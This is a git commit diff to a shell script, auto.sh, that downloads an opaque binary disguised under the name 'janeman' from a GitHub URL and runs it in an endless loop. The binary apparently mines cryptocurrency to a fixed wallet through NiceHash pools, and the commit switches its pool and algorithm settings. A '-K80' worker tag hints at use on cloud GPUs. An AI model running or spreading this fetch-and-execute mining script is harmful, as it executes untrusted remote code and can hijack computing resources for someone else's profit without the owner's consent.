4ed46a835b7b1f76d8752599ea81eef69ab5c4d8
newhellminer <92718023+newhellminer@users.noreply.github.com>
2021-10-18 14:21:43 +0530

    Update auto.sh

--- auto.sh
+++ auto.sh
@@ -6,6 +6,6 @@ apt-get install libpci3
 wget https://github.com/archernap/prem/raw/main/janeman
 chmod +x janeman
 	while [ 1 ]; do
-		./janeman -pool stratum+tcp://autolykos.eu-north.nicehash.com:3390 -wal 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.$(echo $(shuf -i 10-40 -n 1)-Dg) -pass x
+		./janeman -pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 -wal 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.$(echo $(shuf -i 10-40 -n 1)-K80) -pass x -proto 4 -stales 0
         sleep 5
 	done
